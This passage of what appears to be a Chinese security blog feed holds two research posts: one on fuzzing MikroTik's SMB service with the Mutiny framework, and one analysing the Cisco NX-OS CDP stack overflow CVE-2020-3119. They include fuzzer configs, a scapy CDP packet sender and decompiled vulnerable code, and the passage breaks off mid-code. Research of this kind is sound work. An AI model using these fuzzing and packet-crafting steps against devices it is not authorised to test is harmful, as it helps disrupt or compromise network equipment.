data-url="aHR0cHM6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwNjE5ODIvU2VjdXJpdHktQWR2aXNvcnktZm9yLU11bHRpcGxlLVZ1bG5lcmFiaWxpdGllcy1vbi1Tb21lLVJvdXRlcnMtTW9iaWxlLVJvdXRlcnMtTW9kZW1zLUdhdGV3YXlzLWFuZC1FeHRlbmRlcnM=">Security Advisory for Multiple Vulnerabilities on Some Routers, Mobile Routers, Modems, Gateways, and Extenders<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BlZHJpYi9Qb0MvYmxvYi9kYTMxN2JiYjIyYWJjMmM4OGM4ZmNhZDA2NjhjZGI5NGIyYmEwYTZmL2Fkdmlzb3JpZXMvUHduMk93bi9Ub2t5b18yMDE5L3Rva3lvX2RyaWZ0L3Rva3lvX2RyaWZ0Lm1k">tokyo_drift<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwMzc2MjI3OQ==">SOAP 介绍<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于安全客，文章链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjA5MjMy">https://www.anquanke.com/post/id/209232<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netgear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MikroTik SMB测试之Mutiny Fuzzer</title>
      <link href="2020/07/01/MikroTik-SMB%E6%B5%8B%E8%AF%95%E4%B9%8BMutiny-Fuzzer/"/>
      <url>2020/07/01/MikroTik-SMB%E6%B5%8B%E8%AF%95%E4%B9%8BMutiny-Fuzzer/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Mutiny</code>是由思科研究人员开发的一款基于变异的网络<code>fuzz</code>框架，其主要原理是通过从数据包(如<code>pcap</code>文件)中解析协议请求并生成一个<code>.fuzzer</code>文件，然后基于该文件对请求进行变异，再发送给待测试的目标。通过这种方式，可以在很短的时间内开始对目标进行<code>fuzz</code>，而不用关心相关网络协议的具体细节。</p><a id="more"></a><p>最近在对<code>MikroTik</code>设备的<code>SMB</code>服务进行分析测试时，在尝试采用基于生成方式的<code>fuzzer</code>没有效果后，试了一下<code>Mutiny Fuzzer</code>，意外地发现了3个漏洞。下面对该过程进行简要介绍。</p><blockquote><p>这里主要采用黑盒测试的方式</p></blockquote><h3 id="Mutiny-Fuzzer简介"><a href="#Mutiny-Fuzzer简介" class="headerlink" title="Mutiny Fuzzer简介"></a><code>Mutiny Fuzzer</code>简介</h3><p><code>Mutiny</code>是一款基于变异的网络协议<code>fuzz</code>框架，其主要是采用<code>Radamsa</code>工具来对数据进行变异。内部的<code>fuzz</code>流程与其他的协议<code>fuzz</code>框架(如<code>Boofuzz</code>，<code>Kitty</code>)类似，也提供了在不同阶段对请求数据进行动态修改、对目标进行监控等功能。</p><p>以<code>master</code>分支为例，主要模块的说明如下。</p><blockquote><p><code>experiment</code>分支加入了更多的特性，如自动生成<code>PoC</code>、反馈机制等。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mutiny-fuzzer</span><br><span class="line">├── backend</span><br><span class="line">│   ├── fuzzerdata.py&#x2F;&#x2F; 与.fuzzer文件解析&#x2F;生成相关</span><br><span class="line">│   ├── fuzzer_types.py&#x2F;&#x2F; 定义fuzz中使用的相关消息类型及工具函数</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── menu_functions.py</span><br><span class="line">│   ├── packets.py</span><br><span class="line">│   └── proc_director.py</span><br><span class="line">├── LICENSE</span><br><span class="line">├── mutiny_classes&#x2F;&#x2F; (需要根据需求进行自定义)</span><br><span class="line">│   ├── exception_processor.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── message_processor.py&#x2F;&#x2F; 提供对请求数据进行动态修改</span><br><span class="line">│   ├── monitor.py&#x2F;&#x2F; 负责对测试目标进行监控，需自己实现</span><br><span class="line">│   └── mutiny_exceptions.py</span><br><span class="line">├── mutiny_prep.py&#x2F;&#x2F; 预处理：解析pcap文件，并生成.fuzzer文件</span><br><span class="line">├── mutiny.py&#x2F;&#x2F; fuzz主程序：基于生成的.fuzzer文件, 对请求进行变异, 然后发送给测试目标</span><br><span class="line">├── radamsa-v0.6.tar.gz</span><br><span class="line">├── readme.md</span><br><span class="line">├── sample_apps</span><br><span class="line">├── tests</span><br><span class="line">└── util</span><br></pre></td></tr></table></figure><h3 id="MikroTik-SMB测试"><a href="#MikroTik-SMB测试" class="headerlink" title="MikroTik SMB测试"></a><code>MikroTik SMB</code>测试</h3><p><code>MikroTik</code>设备支持<code>SMB</code>协议，相关的功能主要在<code>/nova/bin/smb</code>程序中。通过对程序代码进行分析，感觉其是由厂商自己实现的，未复用第三方库，考虑到<code>SMB</code>协议的复杂性，该程序似乎是一个不错的<code>fuzz</code>目标。默认情况下<code>smb</code>服务是关闭的，可通过如下命令开启。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ip smb set enabled=yes</span><br></pre></td></tr></table></figure><p>通常，对比较复杂的网络协议进行测试，笔者会优先考虑基于生成的<code>fuzz</code>方式，即根据协议格式去定义请求，然后对请求进行变异，保证变异后的请求仍然是”符合”协议格式的。因为如果协议比较复杂的话，协议之间的关联或约束会比较多，基于变异的方式很大可能会破坏请求的协议格式，无法通过程序内的校验，造成<code>fuzz</code>的效率低下。</p><p>在采用基于生成的方式进行<code>fuzz</code>后，并没有发现问题。想到之前有国外研究人员利用<code>Mutiny</code>工具在<code>smb</code>服务中发现了漏洞<code>CVE-2018–7445</code>，于是打算尝试下<code>Mutiny</code>工具。文章 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXhpLi9maW5kaW5nLWFuZC1leHBsb2l0aW5nLWN2ZS0yMDE4LTc0NDUtZjMxMDNmMTYzY2Mx">Finding and exploiting CVE-2018–7445 (unauthenticated RCE in MikroTik’s RouterOS SMB)<i class="fa fa-external-link-alt"></i></span> 详细介绍了作者从环境搭建、测试、漏洞分析到漏洞利用的整个过程，感兴趣的可以看一下。</p><blockquote><p>在采用基于生成的方式进行<code>fuzz</code>时，笔者主要关注的是<code>smb</code>协议中无需认证的部分，因此只对部分请求进行了测试。</p></blockquote><h4 id="fuzzer文件生成"><a href="#fuzzer文件生成" class="headerlink" title=".fuzzer文件生成"></a><code>.fuzzer</code>文件生成</h4><p>以<code>stable 6.44.2</code>版本为例，在开启<code>smb</code>服务后，在<code>win10</code>下访问对应的共享文件夹，同时利用<code>wireshark</code>捕获数据包，部分请求如下。</p><img data-src="images/smb2_example.png"><p>根据<code>SMB</code>协议的交互流程，前面几个请求如<code>Negotiate Protocol</code>、<code>Session Setup</code>等是无需认证的，由于笔者主要关注无需认证的攻击面，因此打算仅对前面几个请求进行<code>fuzz</code>。</p><p>在有了数据包之后，运行<code>mutiny_prep.py</code>对数据包进行处理，生成<code>mutiny</code>需要的<code>.fuzzer</code>文件。同时，可以根据自己的需求对生成的<code>.fuzzer</code>文件进行自定义修改，部分示例如下。需要说明的是，根据<code>mutiny</code>的<code>fuzz</code>流程，建议为每个请求单独生成一个<code>.fuzzer</code>文件。</p><blockquote><p>笔者曾问过关于<code>mutiny</code>的处理逻辑，可参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Npc2NvLVRhbG9zL211dGlueS1mdXp6ZXIvaXNzdWVzLzk=">这里<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># Directory containing any custom exception&#x2F;message&#x2F;monitor processors</span><br><span class="line"># This should be either an absolute path or relative to the .fuzzer file</span><br><span class="line"># If set to &quot;default&quot;, Mutiny will use any processors in the same</span><br><span class="line"># folder as the .fuzzer file</span><br><span class="line">processor_dir default</span><br><span class="line"># Number of times to retry a test case causing a crash</span><br><span class="line">failureThreshold 3</span><br><span class="line"># How long to wait between retrying test cases causing a crash</span><br><span class="line">failureTimeout 1</span><br><span class="line"># How long for recv() to block when waiting on data from server</span><br><span class="line">receiveTimeout 1.0</span><br><span class="line"># Whether to perform an unfuzzed test run before fuzzing</span><br><span class="line">shouldPerformTestRun 0</span><br><span class="line"># Protocol (udp or tcp)</span><br><span class="line">proto tcp</span><br><span class="line"># Port number to connect to</span><br><span class="line">port 445</span><br><span class="line"># Port number to connect from</span><br><span class="line">sourcePort -1</span><br><span class="line"># Source IP to connect from</span><br><span class="line">sourceIP 0.0.0.0</span><br><span class="line"></span><br><span class="line"># The actual messages in the conversation</span><br><span class="line"># Each contains a message to be sent to or from the server, printably-formatted</span><br><span class="line">outbound fuzz &#39;\x00\x00\x00\xee\xfeSMB@\x00\x01\x00\x00\x00\x00\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x05\x00\x01\x00\x00\x00\x7f\x00\x00\x00\xd1\xc5\x81\xc2\xec\x88\xea\x11\x83\xce4\x17\xeb\xc5\x0c&#123;p\x00\x00\x00\x04\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00&amp;\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\xd4\xfa\xbc^\xc5g\x8a9\xeaP\xe6\xa0(\x13\xc7\xa9\xa9@\xf40\x0f\xc3\xe3\x98\x89\xc54\x1e\xb46h\xea\x00\x00\x02\x00\x06\x00\x00\x00\x00\x00\x02\x00\x02\x00\x01\x00\x00\x00\x03\x00\x0e\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x05\x00\x1e\x00\x00\x00\x00\x001\x009\x002\x00.\x001\x006\x008\x00.\x002\x000\x000\x00.\x001\x005\x002\x00&#39;</span><br><span class="line">inbound &#39;\x00\x00\x00\xca\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00A\x00\x01\x00\x02\x02\x00\x00\\\x91\xc5!\x89D\x11\xea\x85g\xc7#&#123;2\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x95Q(Q\x1d\xd6\x01\x80\x96&#x2F;\x1eQ\x1d\xd6\x01\x80\x00J\x00\x00\x00\x00\x00&#96;H\x06\x06+\x06\x01\x05\x05\x02\xa0&gt;0&lt;\xa0\x0e0\x0c\x06\n+\x06\x01\x04\x01\x827\x02\x02\n\xa3*0(\xa0&amp;\x1b$not_defined_in_RFC4178@please_ignore&#39;</span><br></pre></td></tr></table></figure><h4 id="目标监控与环境恢复"><a href="#目标监控与环境恢复" class="headerlink" title="目标监控与环境恢复"></a>目标监控与环境恢复</h4><p>在有了对应的<code>.fuzzer</code>文件后，运行<code>mutiny.py</code>脚本，就可以开始对目标进行<code>fuzz</code>了。</p><blockquote><p><code>Mutiny</code>框架的目的就是让使用者能尽可能快地开始对目标进行<code>fuzz</code>。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./mutiny.py -s 0.1 --logAll ./&lt;path to .fuzzer file&gt; &lt;ip&gt;</span></span><br></pre></td></tr></table></figure><p>上面的命令会记录所有的输出，为了后续更方便地对畸形用例进行定位及重放，考虑增加对目标是否发生异常进行监控。由于<code>smb</code>服务会监听<code>445/tcp</code>端口，而当<code>smb</code>程序崩溃时，该端口会不可访问，因此可以通过探测<code>445/tcp</code>端口是否可访问的方式来监控目标是否发生异常，对应的代码可以添加在<code>mutiny_classes/monitor.py</code>中。这样，当目标出现崩溃时，日志中会记录崩溃对应的测试用例编号。</p><p>另外，虽然<code>smb</code>程序崩溃后会自动重启，但当发生多次异常后<code>smb</code>环境会出现小问题，同时为了保证每次<code>smb</code>程序重启后环境与最开始一样，考虑到整个<code>mikrotik</code>系统运行在<code>vmware</code>中，因此可以考虑借助<code>vmware</code>快照的方式保证环境的一致，即在最开始时拍摄快照，当目标发生崩溃后恢复快照，然后再继续进行<code>fuzz</code>。同样，对应的代码可以添加在<code>mutiny_classes/monitor.py</code>中。</p><p>现在可以开始对目标进行<code>fuzz</code>了。当然，如果直接采用最原始的<code>.fuzzer</code>文件，即直接对整个请求进行变异，发现崩溃的耗时可能会比较长。因为<code>SMB</code>协议中包含<code>magic</code>(<code>·\xfe\x53\x4d\x42</code>，以<code>smb2</code>为例)、<code>command</code>(<code>0x0</code>(<code>Negotiate Protocol</code>),<code>0x01</code>(<code>Session Setup</code>))等字段，如果这些字段不符合协议约定的话，生成的测试用例大概率会被程序丢弃。因此还是要借助对协议的理解和对程序进行逆向，了解程序内部协议的大概处理流程(比如校验哪些字段)，然后对<code>.fuzzer</code>文件进行修改，指定哪些部分保持不变、对哪些部分进行变异等。</p><h4 id="崩溃用例分析"><a href="#崩溃用例分析" class="headerlink" title="崩溃用例分析"></a>崩溃用例分析</h4><p>在运行一段时间后，发现了多个测试用例会造成目标程序崩溃，通过对测试用例进行重放和分析，最终共有3个测试用例会造成不同的崩溃，其中的一个测试用例如下。</p><img data-src="images/crash_smb2_example.png"><p>这个测试用例比较有意思的是，在正常的<code>Negotiate Protocol</code>请求之后，又多了一层<code>NetBIOS Session Service</code>数据包。由于是针对单个<code>Negotiate Protocol</code>请求进行<code>fuzz</code>，如果采用常规的基于生成的方式，即仅对协议内的字段进行变异，似乎很难生成这样的测试用例。而采用变异的方式，出乎意料的得到了这样一个测试用例，这可能得益于<code>Radamsa</code>工具的强大能力。当然，变异的方式也有其弊端，比如对前面某个字段进行变异，很可能由于这个字段违背了协议规约，造成其后面的字段全部被”破坏”，牵一发而动全身。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文对<code>Mutiny-Fuzzer</code>框架进行了简要介绍，并针对<code>MikroTik</code>设备的<code>smb</code>服务进行了简单测试。当需要对复杂网络协议进行测试时，可以尝试一下<code>Mutiny-Fuzzer</code>框架，”快”就是优势，说不定会有意外收获。当然，在对协议和目标有了一定的了解后，可以对其进行改进，或者采用更有效的<code>fuzz</code>方式。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Npc2NvLVRhbG9zL211dGlueS1mdXp6ZXI=">mutiny-fuzzer<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXhpLi9maW5kaW5nLWFuZC1leHBsb2l0aW5nLWN2ZS0yMDE4LTc0NDUtZjMxMDNmMTYzY2Mx">Finding and exploiting CVE-2018–7445 (unauthenticated RCE in MikroTik’s RouterOS SMB)<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于信安之路，文章链接：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvckEteWRLd25HZ2t5NWpZeE1kLUg0Zw==">https://mp.weixin.qq.com/s/rA-ydKwnGgky5jYxMd-H4g<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mikrotik </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDPwn系列之CVE-2020-3119分析</title>
      <link href="2020/06/25/CDPwn%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2020-3119%E5%88%86%E6%9E%90/"/>
      <url>2020/06/25/CDPwn%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2020-3119%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><code>CDPwn</code>系列漏洞是由来自<code>Armis</code>的安全研究员在思科<code>CDP(Cisco Discovery Protocol)</code>协议中发现的5个<code>0 day</code>漏洞，影响的产品包括思科交换机、路由器、<code>IP</code>电话以及摄像机等。其中，<code>CVE-2020-3119</code>是<code>NX-OS</code>系统中存在的一个栈溢出漏洞，利用该漏洞可在受影响的设备(如<code>Nexus</code>系列交换机)上实现任意代码执行，如修改<code>Nexus</code>交换机的配置以穿越<code>VLAN</code>等。</p><a id="more"></a><p>下面借助<code>GNS3</code>软件搭建<code>Nexus</code>交换机仿真环境，来对该漏洞进行分析。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>根据<span class="exturl" data-url="aHR0cHM6Ly90b29scy5jaXNjby5jb20vc2VjdXJpdHkvY2VudGVyL2NvbnRlbnQvQ2lzY29TZWN1cml0eUFkdmlzb3J5L2Npc2NvLXNhLTIwMjAwMjA1LW54b3MtY2RwLXJjZQ==">漏洞公告<i class="fa fa-external-link-alt"></i></span>，选取<code>Nexus 9000 Series Switches in standalone NX-OS mode</code>作为分析目标，获取到对应的镜像如<code>nxosv.9.2.2.qcow2</code>后，根据<code>GNS3</code>提供的<code>Cisco NX-OSv 9000 appliance</code>中的模板进行操作即可。需要说明的是，</p><ul><li>与思科<code>ASAV</code>防火墙不同，模拟<code>Nexus 9000</code>系列交换机除了需要设备镜像外，还需要一个<code>UEFI</code>格式的启动文件；</li><li>模拟<code>Nexus 9000</code>系列交换机对虚拟机的配置要求较高(<code>8G</code>内存)，建议采用<code>GNS3</code>设备模板中的默认配置，降低配置的话可能导致设备无法启动。</li></ul><p>设备启动后，建议连接到设备的<code>Ethernet1/1 </code>口，之后对设备进行配置。</p><p>在<code>Nexus 9000</code>系列交换机上，存在以下3种<code>shell</code>：</p><ul><li><p><code>vsh</code>：正常配置设备时<code>CLI</code>界面的<code>shell</code>；</p></li><li><p><code>guestshell</code>：在<code>vsh</code>中运行<code>guestshell</code>命令后进入的<code>shell</code>，可以运行常见的<code>shell</code>命令；</p></li><li><p><code>bash shell</code>：在<code>vsh</code>中运行<code>run bash</code>命令后进入的<code>shell</code>，可以查看底层系统中的文件，以及设备上的进程信息等；</p><blockquote><p>需要先在<code>configure</code>模式下，运行<code>feature bash-shell</code>开启<code>bash shell</code></p></blockquote></li></ul><p>默认配置下，<code>bash shell</code>中是没有<code>ip</code>信息的。为了方便后续进行分析调试，需要给之前连接的<code>Ethernet1/1</code>口配置<code>ip</code>信息，根据<code>mac</code>地址查找对应的网口，然后配置对应的<code>ip</code>即可。</p><blockquote><p>设备的<code>mgmt</code>口在<code>bash shell</code>下不存在对应的网口</p></blockquote><p>另外，由于采用<code>binwalk</code>工具对设备镜像进行解压提取失败，因而直接通过<code>bash shell</code>拷贝设备文件系统中的文件：将公钥置于<code>/root/.ssh/authorized_keys</code>，然后通过<code>scp</code>方式进行拷贝即可。</p><blockquote><p>Update：从<code>qcow2</code>文件中提取出对应的<code>bin</code>文件如<code>nxos.9.2.2.bin</code>，然后使用<code>7z</code>等工具直接对<code>bin</code>文件进行解压，即可提取出文件系统，其中包含<code>cdpd</code>等程序。</p></blockquote><h3 id="CDP数据包分析"><a href="#CDP数据包分析" class="headerlink" title="CDP数据包分析"></a><code>CDP</code>数据包分析</h3><p>为了便于后续的分析，需要先了解<code>CDP</code>数据包的相关格式。在<code>GNS3</code>中设备之间的链路上捕获流量，看到设备发送的<code>CDP</code>数据包示例如下。</p><img data-src="images/cdp_proto_example.png" style="zoom:90%"><p>可以看到，除了开始的<code>version</code>、<code>ttl</code>和<code>checksum</code>字段外，后面的每一部分都是典型的<code>TLV(Type-Length-Value)</code>格式，<code>Device ID</code>和<code>Addresses</code>部分的字段明细如下。其中，在<code>Addresses</code>部分，其<code>Value</code>还有更细致的格式。</p><img data-src="images/cdp_device_id_example.png" style="zoom:60%"><img data-src="images/cdp_address_example.png" style="zoom:60%"><img data-src="images/cdp_address_ipv4_example.png" style="zoom:70%"><p>另外，<code>python</code> <code>scapy</code>模块支持<code>CDP</code>协议，可以很方便地构造和发送<code>CDP</code>数据包，示例如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.contrib <span class="keyword">import</span> cdp</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Dot3, LLC, SNAP, sendp</span><br><span class="line"></span><br><span class="line">ethernet = Dot3(dst=<span class="string">&quot;01:00:0c:cc:cc:cc&quot;</span>)</span><br><span class="line">llc = LLC(dsap=<span class="number">0xaa</span>, ssap=<span class="number">0xaa</span>, ctrl=<span class="number">0x03</span>)/SNAP()</span><br><span class="line"><span class="comment"># Cisco Discovery Protocol</span></span><br><span class="line">cdp_header = cdp.CDPv2_HDR(vers=<span class="number">2</span>, ttl=<span class="number">180</span>)</span><br><span class="line">deviceid = cdp.CDPMsgDeviceID(val=<span class="string">&#x27;nxos922(97RROM91ST3)&#x27;</span>)</span><br><span class="line">portid = cdp.CDPMsgPortID(iface=<span class="string">&quot;br0&quot;</span>)</span><br><span class="line">address = cdp.CDPMsgAddr(naddr=<span class="number">1</span>, addr=cdp.CDPAddrRecordIPv4(addr=<span class="string">&quot;192.168.110.130&quot;</span>))</span><br><span class="line">cap = cdp.CDPMsgCapabilities(cap=<span class="number">1</span>)</span><br><span class="line">power_req = cdp.CDPMsgUnknown19(val=<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">power_level = cdp.CDPMsgPower(power=<span class="number">16</span>)</span><br><span class="line">cdp_packet = cdp_header/deviceid/portid/address/cap/power_req/power_level</span><br><span class="line"></span><br><span class="line">sendp(ethernet/llc/cdp_packet, iface=<span class="string">&quot;ens36&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据<code>Armis</code>的<span class="exturl" data-url="aHR0cHM6Ly9pbmZvLmFybWlzLmNvbS9ycy82NDUtUERDLTA0Ny9pbWFnZXMvQXJtaXMtQ0RQd24tV1AucGRm">技术报告<i class="fa fa-external-link-alt"></i></span>可知，该漏洞存在于程序<code>/isan/bin/cdpd</code>中的函数<code>cdpd_poe_handle_pwr_tlvs()</code>里，其主要功能是对<code>Power Request(type=0x19)</code>部分的数据进行解析和处理，该部分的协议格式示例如下。</p><img data-src="images/cdp_pwr_example.png" style="zoom:90%"><p>函数<code>cdpd_poe_handle_pwr_tlvs()</code>的部分伪代码如下，其中，<code>cdp_payload_pwr_req_ptr</code>指向<code>Power Request(type=0x19)</code>部分的起始处。可以看到，首先在<code>(1)</code>处获取到<code>Length</code>字段的值，在<code>(2)</code>处计算得到<code>Power Requested</code>字段的个数(<code>Type</code> + <code>Length</code> + <code>Request-ID</code> + <code>Management-ID</code>为8字节，<code>Power Requested</code>字段每项为<code>4</code>字节)，之后在<code>(4)</code>处将每个<code>Power Requested</code>字段的值保存到<code>v35</code>指向的内存空间中。由于<code>v35</code>指向的内存区域为栈(在<code>(3)</code>处获取局部变量的地址，其距离<code>ebp</code>的大小为<code>0x40</code>)，而循环的次数外部可控，因此当<code>Power Requested</code>字段的个数超过<code>0x11</code>后，将覆盖栈上的返回地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为方便理解, 对函数/变量进行了重命名</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> __cdecl <span class="title">cdpd_poe_handle_pwr_tlvs</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">int</span> cdp_payload_pwr_cons_ptr, _WORD *cdp_payload_pwr_req_ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v32 = *a1;</span><br><span class="line">  result = cdp_payload_pwr_cons_ptr == <span class="number">0</span>;</span><br><span class="line">  v33 = cdp_payload_pwr_req_ptr == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cdp_payload_pwr_cons_ptr || !v33 )</span><br><span class="line">  &#123;</span><br><span class="line">    v28 = a1 + <span class="number">300</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v33 &amp;&amp; cdp_payload_pwr_cons_ptr )  <span class="comment">// version 1</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !result &amp;&amp; !v33 )  <span class="comment">// version 2</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ... </span></span><br><span class="line">      cdp_payload_pwr_req_len_field = __ROR2__(cdp_payload_pwr_req_ptr[<span class="number">1</span>], <span class="number">8</span>);  <span class="comment">// (1)</span></span><br><span class="line">      cdp_payload_pwr_req_req_id = __ROR2__(cdp_payload_pwr_req_ptr[<span class="number">2</span>], <span class="number">8</span>);</span><br><span class="line">      cdp_payload_pwr_req_mgmt_id = __ROR2__(cdp_payload_pwr_req_ptr[<span class="number">3</span>], <span class="number">8</span>);</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      v8 = cdp_payload_pwr_req_len_field - <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v8 &lt; <span class="number">0</span> )</span><br><span class="line">        v8 = cdp_payload_pwr_req_len_field - <span class="number">5</span>; </span><br><span class="line">      cdp_payload_pwr_req_num_of_level = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt;&gt; <span class="number">2</span>;  <span class="comment">// (2)</span></span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)cdp_payload_pwr_req_num_of_level &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cdp_payload_pwr_req_level_ptr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(cdp_payload_pwr_req_ptr + <span class="number">4</span>);</span><br><span class="line">        v35 = &amp;cdp_payload_pwr_cons_len_field;  <span class="comment">// (3) cdp_payload_pwr_cons_len_field: [ebp-0x40]</span></span><br><span class="line">        pwr_levels_count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          *v35 = _byteswap_ulong(*cdp_payload_pwr_req_level_ptr);  <span class="comment">// (4)</span></span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">          a1[pwr_levels_count + <span class="number">311</span>] = 